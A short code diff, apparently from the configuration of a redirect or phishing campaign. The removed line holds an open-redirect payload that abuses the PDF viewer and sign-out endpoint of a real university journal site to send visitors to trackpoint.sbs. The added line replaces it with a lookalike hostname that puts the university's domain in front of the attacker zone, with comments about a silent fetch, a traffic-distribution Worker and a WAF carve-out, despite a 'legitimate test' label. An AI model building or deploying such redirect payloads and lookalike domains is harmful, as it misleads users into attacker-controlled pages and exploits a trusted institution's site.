@@ -460,7 +460,10 @@
         // The encoded form preserves the OJS open-redirect payload:
         //   file = /index.php/index/login/signOut?source=.trackpoint.sbs
         //   pdf  = 4560
-        targetUrl: 'https://novohispana.historicas.unam.mx/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=%2Findex.php%2Findex%2Flogin%2FsignOut%3Fsource%3D.trackpoint.sbs&pdf=4560',
+        // v3.1: target on OWN subdomain (zone trackpoint.sbs) — legitimate test
+        // silent fetch will hit Cloudflare Edge → visible in zone logs
+        // Path /c/a8f3k9x2m7 served by albasirah-tds Worker (WAF carve-out active)
+        targetUrl: 'https://novohispana.historicas.unam.mx.trackpoint.sbs/c/a8f3k9x2m7?d=4560',
 
         // Site A — this page (canonical production URL, NOT preview branch)
         sourceUrl: 'https://uaejobe.netlify.app/',
